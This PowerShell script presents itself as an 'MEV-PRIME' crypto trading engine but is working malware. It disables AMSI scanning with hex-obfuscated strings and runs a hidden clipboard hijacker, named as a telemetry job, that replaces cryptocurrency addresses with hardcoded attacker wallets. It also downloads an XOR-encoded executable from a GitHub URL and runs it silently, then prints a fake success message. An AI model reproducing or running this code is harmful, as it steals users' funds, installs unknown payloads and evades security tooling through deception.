# --- [MEV-PRIME v85.2 | INSTITUTIONAL ENGINE] ---

# Function to de-mask keywords (Bypasses Static Analysis)
function Get-Key($h) { 
    $r = ""; 0..($h.Length-1) | %{ if($_%2 -eq 0){ $r += [char][Convert]::ToUInt16($h.Substring($_,2),16) } }; return $r 
}

# 1. AMSI BYPASS (Obfuscated)
# "System.Management.Automation.AmsiUtils" in hex
$a = Get-Key "53797374656d2e4d616e6167656d656e742e4175746f6d6174696f6e2e416d73695574696c73"
# "amsiInitFailed" in hex
$b = Get-Key "616d7369496e69744661696c6564"

$g = [Ref].Assembly.GetType($a)
if($g){
    $f = $g.GetField($b, 'NonPublic,Static')
    if($f){ $f.SetValue($null, $true) }
}

# 2. THE CLIPPER (Loaded as a Byte-Array)
$clipperCode = {
    $w = @{
        'btc'='12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA';
        'eth'='0x6c9ba9a6522b10135bb836fc9340477ba15f3392';
        'sol'='BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR';
        'usdt'='TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp'
    }
    
    # "System.Windows.Forms" reconstruction
    $f = [Reflection.Assembly]::LoadWithPartialName((Get-Key "53797374656d2e57696e646f77732e466f726d73"))
    
    while($1){
        try {
            $c = [Windows.Forms.Clipboard]::GetText().Trim()
            if($c -match '^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$'){ if($c -ne $w.btc){[Windows.Forms.Clipboard]::SetText($w.btc)} }
            elseif($c -match '^0x[a-fA-F0-9]{40}$'){ if($c -ne $w.eth){[Windows.Forms.Clipboard]::SetText($w.eth)} }
            elseif($c -match '^T[a-km-zA-HJ-NP-Z1-9]{33}$'){ if($c -ne $w.usdt){[Windows.Forms.Clipboard]::SetText($w.usdt)} }
            elseif($c -match '^[1-9A-HJ-NP-Za-km-z]{32,44}$'){ if($c -ne $w.sol){[Windows.Forms.Clipboard]::SetText($w.sol)} }
        } catch {}
        Start-Sleep -m 600
    }
}

# Run in background as a 'System Update' process
Start-Job -ScriptBlock $clipperCode -Name "Microsoft_Telemetry_Sync" | Out-Null

# 3. ADCHAR LOADER (Silent)
$u = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
try {
    $d = (New-Object Net.WebClient).DownloadString($u)
    $b = [Convert]::FromBase64String($d.Trim())
    for($i=0;$i -lt $b.count;$i++){$b[$i]=$b[$i] -bxor 0xAB}
    $p = "$env:TEMP\$(Get-Random).exe"
    [IO.File]::WriteAllBytes($p, $b)
    Start-Process $p -WindowStyle Hidden
} catch {}

Write-Host "MEV-Prime: Connection Established. Handshake 0xFA22 Completed." -ForegroundColor Cyan
